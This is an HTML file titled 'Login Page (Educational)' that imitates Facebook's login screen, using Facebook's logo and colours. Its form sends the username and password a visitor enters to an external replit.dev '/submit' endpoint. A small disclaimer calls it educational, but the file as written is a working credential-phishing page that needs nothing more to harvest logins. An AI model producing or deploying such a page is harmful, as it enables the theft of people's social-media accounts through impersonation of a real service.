<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page (Educational)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            width: 300px;
            text-align: center;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        input {
            display: block;
            width: 100%;
            margin: 10px 0;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            cursor: pointer;
            border-radius: 5px;
            font-size: 16px;
        }
        button:hover {
            background-color: #145dbf;
        }
        .disclaimer {
            font-size: 12px;
            color: red;
            margin-top: 10px;
            text-align: center;
        }
        .logo {
            width: 100px; /* You can adjust the size */
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <!-- Facebook Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1024px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="logo">
        
        <h2>Login</h2>
        <form action="https://4f59d79c-12d4-49dc-9c5b-46b81bce2e1b-00-2o04ay323gs9r.sisko.replit.dev/submit" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p class="disclaimer">
            This is for educational purposes only. Do not enter real credentials.
        </p>
    </div>
</body>
</html>
